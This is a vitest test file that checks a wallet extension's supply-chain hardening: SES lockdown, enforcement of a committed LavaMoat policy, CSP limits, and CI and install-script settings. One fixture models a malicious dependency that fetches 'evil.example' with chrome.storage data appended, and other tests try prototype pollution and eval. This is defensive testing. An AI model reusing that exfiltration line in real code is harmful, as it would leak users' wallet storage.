import { describe, it, expect } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import vm from 'node:vm';

import {
  DEFAULT_LOCKDOWN_OPTIONS,
  SEVERE_ENABLEMENTS_ORIGINAL,
  extendSevereEnablements,
  generateLockdownRuntime,
  readSesShim,
  validateLockdownOptions,
  type SesLockdownOptions,
} from '../../packages/vite-plugin-lavamoat/src/lockdownRuntime';
import {
  cleanModuleId,
  findPolicyViolations,
  isGlobalCovered,
  packageNameFromPath,
  stringifyPolicy,
  validatePolicy,
  type LavaMoatPolicy,
} from '../../packages/vite-plugin-lavamoat/src/policy';
import { observePolicy } from '../../packages/vite-plugin-lavamoat/src/observe';
import {
  lockdownScriptTag,
  resolvePolicyMode,
} from '../../packages/vite-plugin-lavamoat/src/plugin';

/**
 * Supply-chain hardening (security review DEP-1 / H-28 / WEXT-9):
 * - every extension page runs a REAL SES lockdown() before any bundle code;
 * - the committed LavaMoat policy is enforced at build time, never rewritten
 *   by a normal build;
 * - the extension CSP no longer allows connecting anywhere over plaintext.
 */

const repoRoot = fileURLToPath(new URL('../../', import.meta.url));
const pluginDir = join(repoRoot, 'packages/vite-plugin-lavamoat/src');
const read = (p: string) => readFileSync(join(repoRoot, p), 'utf8');

/** Run the generated lavamoat-lockdown.js in a fresh realm. */
function runLockdownInFreshRealm(options?: SesLockdownOptions) {
  const code = generateLockdownRuntime(readSesShim(pluginDir), options);
  const context = vm.createContext({});
  vm.runInContext(code, context);
  return {
    context,
    run: <T>(src: string): T => vm.runInContext(src, context) as T,
  };
}

describe('lavamoat-lockdown.js really runs SES lockdown()', () => {
  it('embeds the installed ses lockdown shim', () => {
    const shim = readSesShim(pluginDir);
    const sesPkg = JSON.parse(read('node_modules/ses/package.json')) as {
      version: string;
    };
    expect(shim.version).toBe(sesPkg.version);
    expect(shim.sha256).toMatch(/^[0-9a-f]{64}$/);
    const code = generateLockdownRuntime(shim);
    expect(code).toContain(`SES ${shim.version}`);
    expect(code).toContain('lockdown({');
  });

  it('freezes the intrinsics of the realm it runs in', () => {
    const { run } = runLockdownInFreshRealm();
    expect(run('Object.isFrozen(Object.prototype)')).toBe(true);
    expect(run('Object.isFrozen(Array.prototype)')).toBe(true);
    expect(run('Object.isFrozen(Function.prototype)')).toBe(true);
    expect(run('Object.isFrozen(Promise.prototype)')).toBe(true);
    expect(run('typeof harden')).toBe('function');
    expect(run('__lavamoat_lockdown_enabled')).toBe(true);
  });

  it('blocks prototype pollution and eval after lockdown', () => {
    const { run } = runLockdownInFreshRealm();
    expect(() => run('"use strict"; Object.prototype.polluted = 1;')).toThrow();
    expect(run('({}).polluted')).toBeUndefined();
    expect(() => run('(0, eval)("1+1")')).toThrow(/SES_NO_EVAL/);
    expect(() => run('new Function("return 1")()')).toThrow();
  });

  it('reports honest self-test results (no compartment claim)', () => {
    const { run } = runLockdownInFreshRealm();
    const results = run<{ type: string; message: string }[]>(
      '__lavamoat_run_security_tests()',
    );
    expect(results.filter((r) => r.type === 'fail')).toEqual([]);
    expect(
      results.some(
        (r) => r.type === 'info' && /NOT enforced at runtime/.test(r.message),
      ),
    ).toBe(true);
    // A dependency cannot replace the self-test to lie about it.
    expect(() =>
      run('"use strict"; globalThis.__lavamoat_run_security_tests = () => [];'),
    ).toThrow();
  });

  it('allows the override patterns the bundle uses (viem fn.call, promise.then)', () => {
    // Regression: viem's tempo actions do `getUserToken.call = call`; under
    // plain SES 'severe' that threw on popup load.
    const { run } = runLockdownInFreshRealm();
    expect(
      run(
        '"use strict"; const f = function () {}; f.call = 42; f.apply = 7; f.call + f.apply',
      ),
    ).toBe(49);
    expect(
      run(
        '"use strict"; const p = Promise.resolve(); p.then = 1; p.catch = 2; p.finally = 3; p.then + p.catch + p.finally',
      ),
    ).toBe(6);
    // ...without unfreezing the intrinsics themselves.
    expect(() =>
      run('"use strict"; Function.prototype.call = function () {};'),
    ).toThrow();
    expect(() =>
      run('"use strict"; Promise.prototype.then = function () {};'),
    ).toThrow();
    expect(run('typeof Function.prototype.call.call')).toBe('function');
  });

  it('patches the SES enablement table exactly once, or fails the build', () => {
    const { source } = readSesShim(pluginDir);
    expect(source.split(SEVERE_ENABLEMENTS_ORIGINAL).length - 1).toBe(1);
    expect(() => extendSevereEnablements('no table here')).toThrow(
      /exactly one SES severeEnablements/,
    );
    expect(() =>
      extendSevereEnablements(
        SEVERE_ENABLEMENTS_ORIGINAL + SEVERE_ENABLEMENTS_ORIGINAL,
      ),
    ).toThrow();
  });

  it('rejects unknown lockdown options at build time', () => {
    expect(() =>
      validateLockdownOptions({
        bogus: 'x',
      } as unknown as SesLockdownOptions),
    ).toThrow(/unsupported SES lockdown option/);
    expect(() =>
      validateLockdownOptions(DEFAULT_LOCKDOWN_OPTIONS),
    ).not.toThrow();
  });

  it('is injected as the first script of every page', () => {
    const tag = lockdownScriptTag('lavamoat-lockdown.js');
    expect(tag.injectTo).toBe('head-prepend');
    expect(tag.attrs.src).toBe('lavamoat-lockdown.js');
  });
});

describe('LavaMoat policy is committed and enforced at build time', () => {
  it('names packages from their node_modules location', () => {
    expect(packageNameFromPath('/r/node_modules/axios/lib/axios.js')).toBe(
      'axios',
    );
    expect(
      packageNameFromPath('/r/node_modules/@solana/web3.js/lib/index.js'),
    ).toBe('@solana/web3.js');
    expect(
      packageNameFromPath(
        '\0/r/node_modules/@solana/web3.js/node_modules/bn.js/lib/bn.js?commonjs-proxy',
      ),
    ).toBe('@solana/web3.js>bn.js');
    expect(packageNameFromPath('/r/src/main.tsx')).toBeUndefined();
    expect(packageNameFromPath('\0vite/preload-helper.js')).toBeUndefined();
    expect(cleanModuleId('\0/a/b.js?commonjs-es-import')).toBe('/a/b.js');
  });

  it('treats a grant on a prefix as covering deeper paths, but not writes', () => {
    expect(
      isGlobalCovered('chrome.storage.local', true, { chrome: true }),
    ).toBe(true);
    expect(isGlobalCovered('fetch', true, { 'chrome.storage': true })).toBe(
      false,
    );
    expect(isGlobalCovered('onmessage', 'write', { onmessage: true })).toBe(
      false,
    );
    expect(isGlobalCovered('onmessage', 'write', { onmessage: 'write' })).toBe(
      true,
    );
  });

  it('flags a dependency that starts using a new global or package', () => {
    const committed: LavaMoatPolicy = {
      resources: { lib: { globals: { setTimeout: true } } },
    };
    const observed = observePolicy([
      {
        id: '/r/node_modules/lib/index.js',
        code: 'import x from "dep"; setTimeout(() => fetch("https://evil.example/" + chrome.storage.local.get()), 1); export default x;',
        importedIds: ['/r/node_modules/dep/index.js'],
      },
      {
        id: '/r/node_modules/dep/index.js',
        code: 'export default localStorage.getItem("k");',
        importedIds: [],
      },
      {
        // first-party code is trusted and not part of the policy
        id: '/r/src/main.tsx',
        code: 'fetch("https://relay.sspwallet.io")',
        importedIds: [],
      },
    ]).policy;
    expect(observed.resources.lib.globals).toMatchObject({
      fetch: true,
      'chrome.storage.local.get': true,
    });
    expect(observed.resources.lib.packages).toEqual({ dep: true });
    expect(observed.resources['$root$']).toBeUndefined();

    const violations = findPolicyViolations(observed, committed);
    expect(violations).toEqual(
      expect.arrayContaining([
        { kind: 'global', packageName: 'lib', item: 'fetch', observed: true },
        {
          kind: 'global',
          packageName: 'lib',
          item: 'chrome.storage.local.get',
          observed: true,
        },
        { kind: 'dependency', packageName: 'lib', item: 'dep' },
        { kind: 'package', packageName: 'dep' },
      ]),
    );
    expect(findPolicyViolations(observed, observed)).toEqual([]);
  });

  it('ships a committed policy that is valid, sorted and derived from the bundle', () => {
    const raw = read('security/vite-lavamoat-policy.json');
    const policy = JSON.parse(raw) as unknown;
    expect(validatePolicy(policy)).toBe(true);
    const typed = policy as LavaMoatPolicy;
    // Byte-identical to what `yarn generate-policy` writes.
    expect(stringifyPolicy(typed)).toBe(raw);
    // Not the old hand-made list keyed by package.json entries.
    for (const devOnly of ['eslint', 'vitest', 'typescript', 'patch-package']) {
      expect(typed.resources[devOnly]).toBeUndefined();
    }
    expect(Object.keys(typed.resources).length).toBeGreaterThan(100);
  });

  it('never regenerates the policy during a normal build', () => {
    const viteConfig = read('vite.config.ts');
    expect(viteConfig).not.toMatch(/generatePolicy:\s*true/);
    expect(viteConfig).toMatch(/policyMode:\s*'check'/);
    expect(resolvePolicyMode('check', undefined)).toBe('check');
    expect(resolvePolicyMode('check', 'write')).toBe('write');
    expect(() => resolvePolicyMode('check', 'yolo')).toThrow();
  });

  it('does not rewrite public/manifest.json during the build', () => {
    const plugin = readFileSync(join(pluginDir, 'plugin.ts'), 'utf8');
    expect(plugin).not.toMatch(/manifest\.json/);
  });
});

describe('extension CSP limits where page code may connect', () => {
  const manifest = JSON.parse(read('public/manifest.json')) as {
    content_security_policy: { extension_pages: string };
  };
  const directives = new Map(
    manifest.content_security_policy.extension_pages
      .split(';')
      .map((d) => d.trim().split(/\s+/))
      .filter((parts) => parts[0])
      .map((parts) => [parts[0], parts.slice(1)] as const),
  );

  it('has no wildcard or plaintext connect-src', () => {
    const connect = directives.get('connect-src') ?? [];
    expect(connect).toEqual(["'self'", 'https:', 'wss:']);
    for (const bad of ['*', 'http:', 'ws:', 'data:', 'blob:']) {
      expect(connect).not.toContain(bad);
    }
  });

  it('keeps script-src free of eval and inline code', () => {
    const script = directives.get('script-src') ?? [];
    expect(script).toEqual(["'self'", "'wasm-unsafe-eval'"]);
    expect(directives.get('default-src')).toEqual(["'none'"]);
  });

  it('no wallet code connects over plaintext http/ws', () => {
    const offenders: string[] = [];
    const walk = (dir: string) => {
      for (const name of readdirSync(dir)) {
        const full = join(dir, name);
        if (statSync(full).isDirectory()) {
          walk(full);
        } else if (/\.(ts|tsx|js)$/.test(name)) {
          const src = readFileSync(full, 'utf8');
          const re =
            /(?:axios(?:\.(?:get|post|put|delete|patch|request))?|fetch|io|new\s+WebSocket|new\s+EventSource)\(\s*[`'"](?:http|ws):\/\//g;
          if (re.test(src)) offenders.push(full.slice(repoRoot.length));
        }
      }
    };
    walk(join(repoRoot, 'src'));
    walk(join(repoRoot, 'public/scripts'));
    expect(offenders).toEqual([]);
  });
});

describe('install scripts and CI (DEP-5 / DEP-10)', () => {
  const pkg = JSON.parse(read('package.json')) as {
    scripts: Record<string, string>;
    lavamoat: { allowScripts: Record<string, boolean> };
  };
  const workflows = ['build-zip.yml', 'deterministic-build.yml'].map(
    (name) => [name, read(`.github/workflows/${name}`)] as const,
  );

  it('never runs dependency install scripts automatically', () => {
    // yarn classic ignores .yarnrc.yml; .yarnrc is the file that counts.
    expect(read('.yarnrc')).toMatch(/^ignore-scripts true$/m);
    const allowed = Object.entries(pkg.lavamoat.allowScripts)
      .filter(([, v]) => v === true)
      .map(([k]) => k);
    expect(allowed).toEqual(['$root$']);
    expect(pkg.scripts.setup).toBe('allow-scripts');
    // The build re-applies patches and rebuilds the plugin, so a stale
    // plugin or an unpatched dependency can never be shipped.
    expect(pkg.scripts.prebuild).toMatch(/patch-package --error-on-fail/);
    expect(pkg.scripts.prebuild).toMatch(/vite-plugin-lavamoat build/);
    expect(Object.values(pkg.scripts).join('\n')).not.toMatch(/\bnpm run\b/);
  });

  it.each(workflows)('%s pins every action by commit SHA', (_name, src) => {
    const uses = [...src.matchAll(/^\s*(?:-\s*)?uses:\s*(\S+)/gm)].map(
      (m) => m[1],
    );
    expect(uses.length).toBeGreaterThan(0);
    for (const u of uses) expect(u).toMatch(/@[0-9a-f]{40}$/);
  });

  it.each(workflows)(
    '%s declares permissions and keeps ${{ }} out of run: scripts',
    (_name, src) => {
      expect(src).toMatch(/^permissions:/m);
      // every `run:` block, up to the next step key
      const runBlocks = src.split(/^\s*run: /m).slice(1);
      for (const block of runBlocks) {
        const body = block.split(/^\s*- (?:name|uses):/m)[0];
        expect(body).not.toMatch(/\$\{\{/);
      }
    },
  );

  it('installs frozen, without scripts, and releases without third-party actions', () => {
    for (const [, src] of workflows) {
      expect(src).not.toMatch(/^\s*cache:\s*["']?yarn/m);
    }
    const buildZip = workflows[0][1];
    expect(buildZip).toMatch(/yarn install --frozen-lockfile --ignore-scripts/);
    expect(buildZip).toMatch(/run: yarn setup/);
    const release = workflows[1][1];
    expect(release).not.toMatch(/softprops\/action-gh-release/);
    expect(release).toMatch(/environment: release/);
    // .asc is only advertised when a signature was produced
    expect(release).toMatch(/if \[\[ "\$SIGNED" == "true" \]\]/);
  });

  it('Docker build pins the base image and runs only allowlisted scripts', () => {
    const dockerfile = read('Dockerfile');
    expect(dockerfile).toMatch(/^FROM node:[\w.-]+@sha256:[0-9a-f]{64}$/m);
    expect(dockerfile).toMatch(
      /yarn install --frozen-lockfile --ignore-scripts/,
    );
    expect(dockerfile).toMatch(/^RUN yarn setup$/m);
    // .git is not in the build context; the commit comes in as a build arg
    expect(dockerfile).toMatch(/^ARG GIT_COMMIT=/m);
    expect(dockerfile).toMatch(/Git Commit: \$\{GIT_COMMIT\}/);
  });
});
